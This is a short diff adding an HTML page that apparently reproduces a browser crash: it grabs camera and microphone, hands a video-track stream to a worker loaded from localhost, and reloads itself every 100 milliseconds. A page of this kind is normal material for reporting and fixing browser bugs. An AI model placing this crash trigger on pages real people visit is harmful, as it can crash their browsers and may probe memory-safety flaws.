@@ -1,0 +1,20 @@
+<button id="button">click me to crash</button>
+<script>
+function onClick(){
+navigator.mediaDevices.getUserMedia({ audio: true, video: { width: 1280, height: 720 } }).then(function(mediaStream) {
+  const worker = new Worker('http://localhost:8605/crash2/ws.js');
+  tracks = mediaStream.getVideoTracks()[0];
+  const processor = new MediaStreamTrackProcessor(tracks);
+  let stream = processor.readable;
+  console.log(stream)
+  worker.postMessage({ type: "stream", stream: stream}, [stream]);
+}).catch(function(e) { });
+}
+//let btn = document.getElementById("button")
+//btn.onclick=onClick;
+onClick();
+setTimeout(function(){
+      console.log("reload")
+      location.reload()
+},100)
+</script>
